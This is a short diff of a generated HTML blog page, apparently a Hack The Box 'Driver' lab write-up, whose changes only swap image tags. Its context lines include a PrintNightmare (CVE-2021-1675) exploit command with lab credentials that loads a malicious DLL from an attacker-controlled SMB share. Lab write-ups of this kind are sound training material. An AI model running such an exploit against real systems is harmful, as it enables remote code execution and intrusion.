@@ -865,10 +865,10 @@
 <p><code>接下来浏览共享文件driver.dll即可上线。</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021–1675.py driver.htb/tony:liltony@10.10.11.106 &#x27;\\10.10.16.5\smb\driver.dll&#x27;</span><br></pre></td></tr></table></figure>
 
+<img src="/2021/11/11/HTB-driver/image-20211111135324817.png" class>
+
 <img src="/2021/11/11/HTB-driver/image-20211111135358519.png" class>
 
-
-<p><img src="/2021/11/11/HTB-driver/xm\hexo\source_posts\HTB-driver\image-20211111135358519.png" alt="image-20211111135358519"></p>
 <img src="/2021/11/11/HTB-driver/image-20211111135939797.png" class>
 
 <img src="/2021/11/11/HTB-driver/image-20211111141208240.png" class>
